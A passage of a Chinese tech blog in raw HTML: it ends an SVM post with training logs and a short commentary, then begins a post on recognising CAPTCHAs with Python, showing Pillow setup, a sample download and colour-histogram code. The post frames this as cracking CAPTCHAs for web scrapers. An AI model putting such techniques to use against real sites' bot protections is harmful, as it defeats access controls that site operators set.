21</div><div class="line">fullSet, iter: 0 i:36, pairs changed 21</div><div class="line">fullSet, iter: 0 i:37, pairs changed 21</div><div class="line">fullSet, iter: 0 i:38, pairs changed 21</div><div class="line">fullSet, iter: 0 i:39, pairs changed 21</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:40, pairs changed 21</div><div class="line">fullSet, iter: 0 i:41, pairs changed 22</div><div class="line">fullSet, iter: 0 i:42, pairs changed 23</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:43, pairs changed 23</div><div class="line">fullSet, iter: 0 i:44, pairs changed 23</div><div class="line">fullSet, iter: 0 i:45, pairs changed 24</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:46, pairs changed 24</div><div class="line">fullSet, iter: 0 i:47, pairs changed 24</div><div class="line">fullSet, iter: 0 i:48, pairs changed 24</div><div class="line">fullSet, iter: 0 i:49, pairs changed 24</div><div class="line">fullSet, iter: 0 i:50, pairs changed 24</div><div class="line">fullSet, iter: 0 i:51, pairs changed 24</div><div class="line">fullSet, iter: 0 i:52, pairs changed 24</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:53, pairs changed 24</div><div class="line">fullSet, iter: 0 i:54, pairs changed 24</div><div class="line">fullSet, iter: 0 i:55, pairs changed 24</div><div class="line">fullSet, iter: 0 i:56, pairs changed 24</div><div class="line">fullSet, iter: 0 i:57, pairs changed 24</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:58, pairs changed 24</div><div class="line">fullSet, iter: 0 i:59, pairs changed 24</div><div class="line">fullSet, iter: 0 i:60, pairs changed 24</div><div class="line">fullSet, iter: 0 i:61, pairs changed 25</div><div class="line">fullSet, iter: 0 i:62, pairs changed 26</div><div class="line">fullSet, iter: 0 i:63, pairs changed 26</div><div class="line">fullSet, iter: 0 i:64, pairs changed 26</div><div class="line">fullSet, iter: 0 i:65, pairs changed 26</div><div class="line">fullSet, iter: 0 i:66, pairs changed 26</div><div class="line">fullSet, iter: 0 i:67, pairs changed 26</div><div class="line">fullSet, iter: 0 i:68, pairs changed 26</div><div class="line">fullSet, iter: 0 i:69, pairs changed 26</div><div class="line">fullSet, iter: 0 i:70, pairs changed 26</div><div class="line">fullSet, iter: 0 i:71, pairs changed 26</div><div class="line">fullSet, iter: 0 i:72, pairs changed 26</div><div class="line">fullSet, iter: 0 i:73, pairs changed 26</div><div class="line">fullSet, iter: 0 i:74, pairs changed 27</div><div class="line">fullSet, iter: 0 i:75, pairs changed 27</div><div class="line">fullSet, iter: 0 i:76, pairs changed 27</div><div class="line">fullSet, iter: 0 i:77, pairs changed 27</div><div class="line">fullSet, iter: 0 i:78, pairs changed 27</div><div class="line">fullSet, iter: 0 i:79, pairs changed 27</div><div class="line">fullSet, iter: 0 i:80, pairs changed 27</div><div class="line">fullSet, iter: 0 i:81, pairs changed 27</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:82, pairs changed 27</div><div class="line">fullSet, iter: 0 i:83, pairs changed 27</div><div class="line">fullSet, iter: 0 i:84, pairs changed 27</div><div class="line">fullSet, iter: 0 i:85, pairs changed 27</div><div class="line">fullSet, iter: 0 i:86, pairs changed 27</div><div class="line">fullSet, iter: 0 i:87, pairs changed 27</div><div class="line">fullSet, iter: 0 i:88, pairs changed 27</div><div class="line">fullSet, iter: 0 i:89, pairs changed 27</div><div class="line">fullSet, iter: 0 i:90, pairs changed 27</div><div class="line">fullSet, iter: 0 i:91, pairs changed 27</div><div class="line">fullSet, iter: 0 i:92, pairs changed 27</div><div class="line">fullSet, iter: 0 i:93, pairs changed 27</div><div class="line">fullSet, iter: 0 i:94, pairs changed 27</div><div class="line">fullSet, iter: 0 i:95, pairs changed 27</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:96, pairs changed 27</div><div class="line">fullSet, iter: 0 i:97, pairs changed 27</div><div class="line">fullSet, iter: 0 i:98, pairs changed 27</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:99, pairs changed 27</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:1, pairs changed 0</div><div class="line">non-bound, iter: 1 i:2, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:3, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:6, pairs changed 1</div><div class="line">non-bound, iter: 1 i:8, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:10, pairs changed 2</div><div class="line">non-bound, iter: 1 i:11, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:13, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:14, pairs changed 3</div><div class="line">non-bound, iter: 1 i:15, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:16, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:18, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:19, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:21, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:23, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:27, pairs changed 4</div><div class="line">non-bound, iter: 1 i:31, pairs changed 5</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:34, pairs changed 5</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:41, pairs changed 5</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:42, pairs changed 5</div><div class="line">non-bound, iter: 1 i:45, pairs changed 6</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:61, pairs changed 6</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:62, pairs changed 6</div><div class="line">non-bound, iter: 1 i:74, pairs changed 7</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:1, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:2, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:3, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:6, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:10, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:13, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:14, pairs changed 0</div><div class="line">non-bound, iter: 2 i:15, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:16, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:18, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:19, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:21, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:23, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:27, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:30, pairs changed 1</div><div class="line">non-bound, iter: 2 i:31, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:34, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:41, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:42, pairs changed 2</div><div class="line">non-bound, iter: 2 i:45, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:58, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:61, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:62, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 2 i:74, pairs changed 3</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:2, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:3, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:6, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:10, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:13, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:14, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:15, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:16, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:18, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:19, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:21, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:23, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:27, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:30, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:34, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:41, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:42, pairs changed 0</div><div class="line">non-bound, iter: 3 i:45, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:58, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:61, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:62, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 3 i:74, pairs changed 0</div><div class="line">iteration number: 4</div><div class="line">fullSet, iter: 4 i:0, pairs changed 0</div><div class="line">fullSet, iter: 4 i:1, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:2, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:3, pairs changed 0</div><div class="line">fullSet, iter: 4 i:4, pairs changed 0</div><div class="line">fullSet, iter: 4 i:5, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:6, pairs changed 0</div><div class="line">fullSet, iter: 4 i:7, pairs changed 0</div><div class="line">fullSet, iter: 4 i:8, pairs changed 0</div><div class="line">fullSet, iter: 4 i:9, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:10, pairs changed 0</div><div class="line">fullSet, iter: 4 i:11, pairs changed 0</div><div class="line">fullSet, iter: 4 i:12, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:13, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:14, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:15, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:16, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:17, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:18, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:19, pairs changed 0</div><div class="line">fullSet, iter: 4 i:20, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:21, pairs changed 0</div><div class="line">fullSet, iter: 4 i:22, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:23, pairs changed 0</div><div class="line">fullSet, iter: 4 i:24, pairs changed 0</div><div class="line">fullSet, iter: 4 i:25, pairs changed 0</div><div class="line">fullSet, iter: 4 i:26, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:27, pairs changed 0</div><div class="line">fullSet, iter: 4 i:28, pairs changed 0</div><div class="line">fullSet, iter: 4 i:29, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:30, pairs changed 0</div><div class="line">fullSet, iter: 4 i:31, pairs changed 0</div><div class="line">fullSet, iter: 4 i:32, pairs changed 0</div><div class="line">fullSet, iter: 4 i:33, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:34, pairs changed 0</div><div class="line">fullSet, iter: 4 i:35, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:36, pairs changed 0</div><div class="line">fullSet, iter: 4 i:37, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:38, pairs changed 0</div><div class="line">fullSet, iter: 4 i:39, pairs changed 0</div><div class="line">fullSet, iter: 4 i:40, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:41, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:42, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:43, pairs changed 0</div><div class="line">fullSet, iter: 4 i:44, pairs changed 0</div><div class="line">fullSet, iter: 4 i:45, pairs changed 0</div><div class="line">fullSet, iter: 4 i:46, pairs changed 0</div><div class="line">fullSet, iter: 4 i:47, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:48, pairs changed 0</div><div class="line">fullSet, iter: 4 i:49, pairs changed 0</div><div class="line">fullSet, iter: 4 i:50, pairs changed 0</div><div class="line">fullSet, iter: 4 i:51, pairs changed 0</div><div class="line">fullSet, iter: 4 i:52, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:53, pairs changed 0</div><div class="line">fullSet, iter: 4 i:54, pairs changed 0</div><div class="line">fullSet, iter: 4 i:55, pairs changed 0</div><div class="line">fullSet, iter: 4 i:56, pairs changed 0</div><div class="line">fullSet, iter: 4 i:57, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:58, pairs changed 0</div><div class="line">fullSet, iter: 4 i:59, pairs changed 0</div><div class="line">fullSet, iter: 4 i:60, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:61, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:62, pairs changed 0</div><div class="line">fullSet, iter: 4 i:63, pairs changed 0</div><div class="line">fullSet, iter: 4 i:64, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:65, pairs changed 0</div><div class="line">fullSet, iter: 4 i:66, pairs changed 0</div><div class="line">fullSet, iter: 4 i:67, pairs changed 0</div><div class="line">fullSet, iter: 4 i:68, pairs changed 0</div><div class="line">fullSet, iter: 4 i:69, pairs changed 0</div><div class="line">fullSet, iter: 4 i:70, pairs changed 0</div><div class="line">fullSet, iter: 4 i:71, pairs changed 0</div><div class="line">fullSet, iter: 4 i:72, pairs changed 0</div><div class="line">fullSet, iter: 4 i:73, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:74, pairs changed 0</div><div class="line">fullSet, iter: 4 i:75, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:76, pairs changed 0</div><div class="line">fullSet, iter: 4 i:77, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:78, pairs changed 0</div><div class="line">fullSet, iter: 4 i:79, pairs changed 0</div><div class="line">fullSet, iter: 4 i:80, pairs changed 0</div><div class="line">fullSet, iter: 4 i:81, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 4 i:82, pairs changed 0</div><div class="line">fullSet, iter: 4 i:83, pairs changed 0</div><div class="line">fullSet, iter: 4 i:84, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:85, pairs changed 0</div><div class="line">fullSet, iter: 4 i:86, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:87, pairs changed 0</div><div class="line">fullSet, iter: 4 i:88, pairs changed 0</div><div class="line">fullSet, iter: 4 i:89, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:90, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:91, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:92, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 4 i:93, pairs changed 0</div><div class="line">fullSet, iter: 4 i:94, pairs changed 0</div><div class="line">fullSet, iter: 4 i:95, pairs changed 0</div><div class="line">fullSet, iter: 4 i:96, pairs changed 0</div><div class="line">fullSet, iter: 4 i:97, pairs changed 0</div><div class="line">fullSet, iter: 4 i:98, pairs changed 0</div><div class="line">fullSet, iter: 4 i:99, pairs changed 0</div><div class="line">iteration number: 5</div><div class="line">there are 22 Support Vectors</div><div class="line">the training error rate is: 0.110000</div><div class="line">the test error rate is: 0.170000</div></pre></td></tr></table></figure></p>
<p>共有100个数据点，其中85个是支持向量，而当k从0.1变动到1.3的时候，支持向量少了很多，此时测试的错误率也在下降。该数据集在这个设置的某处存在最优值。如果降低了$\sigma$，那么训练错误率就会降低，但是测试错误率回升高。</p>
<p>支持向量的数目会存在一个最优值。SVM的优点在于他能够对数据进行高效分类。如果支持向量很少，那么就会得到一个很差的决策边界；如果支持向量很多，那么就相当于每次都利用整个数据集进行分类，这种方法成为k近邻。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/07/15/python-e8-af-86-e5-88-ab-e9-aa-8c-e8-af-81-e7-a0-81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/07/15/python-e8-af-86-e5-88-ab-e9-aa-8c-e8-af-81-e7-a0-81/" itemprop="url">Python识别验证码</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-07-15T22:53:49+08:00">
                2016-07-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python/" itemprop="url" rel="index">
                    <span itemprop="name">Python</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在网页爬虫的时候往往我们需要破解验证码，这篇博文是为了论证如何依赖Python来识别验证码。</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>首先我们需要安装PIL这个库。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install libtiff5-dev libjpeg8-dev zlib1g-dev \</div><div class="line">libfreetype6-dev liblcms2-dev libwebp-dev tcl8.6-dev tk8.6-dev python-tk</div><div class="line">sudo pip install pillow</div></pre></td></tr></table></figure></p>
<p>Pillow相对于老版本的PIL好处已经在网上有很多，这里也不再介绍了。。。</p>
<h1 id="提取图片文件"><a href="#提取图片文件" class="headerlink" title="提取图片文件"></a>提取图片文件</h1><p>首先我们可以下载一个验证码包，你可以使用下面的命令下载：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ wget http://labfile.oss.aliyuncs.com/courses/364/python_captcha.zip</div><div class="line">$ unzip python_captcha.zip</div><div class="line">$ <span class="built_in">cd</span> python_captcha</div></pre></td></tr></table></figure></p>
<p>这样就可以下载到验证码了。</p>
<p>比如这一张：<img src="/wp-content/uploads/2016/07/captcha.gif" alt="captcha"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:UTF-8</span></div><div class="line">__author__ = <span class="string">'exbot'</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">im = Image.open(<span class="string">"python_captcha/captcha.gif"</span>)</div><div class="line"><span class="comment">#(将图片转换为8位像素模式)</span></div><div class="line">im = im.convert(<span class="string">"P"</span>)</div><div class="line"></div><div class="line"><span class="comment">#打印颜色直方图</span></div><div class="line"><span class="keyword">print</span> im.histogram()</div></pre></td></tr></table></figure></p>
<p>这样最后就能输出颜色的直方图：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">132</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">365</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">625</span>]</div></pre></td></tr></table></figure></p>
<p>颜色直方图的每一位数字都代表了在图片中含有对应位的颜色的像素的数量。</p>
<p>每个像素点可表现256种颜色，你会发现白点是最多（白色序号255的位置，也就是最后一位，可以看到，有625个白色像素）。红像素在序号200左右，我们可以通过排序，得到有用的颜色。</p>
<p>接下来，我们继续操作这个直方图：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">his = im.histogram()</div><div class="line">values = &#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">    values[i] = his[i]</div><div class="line"></div><div class="line"><span class="keyword">for</span> j,k <span class="keyword">in</span> sorted(values.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse = <span class="keyword">True</span>)[:<span class="number">10</span>]:</div><div class="line">    <span class="keyword">print</span> j,k</div></pre></td></tr></table></figure></p>
<p>这样就会按照顺序输出直方图中的原来值和对应的键值的序列了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">255 625</div><div class="line">212 365</div><div class="line">220 186</div><div class="line">219 135</div><div class="line">169 132</div><div class="line">227 116</div><div class="line">213 115</div><div class="line">234 21</div><div class="line">205 18</div><div class="line">184 15</div></pre></td></tr></table></figure></p>
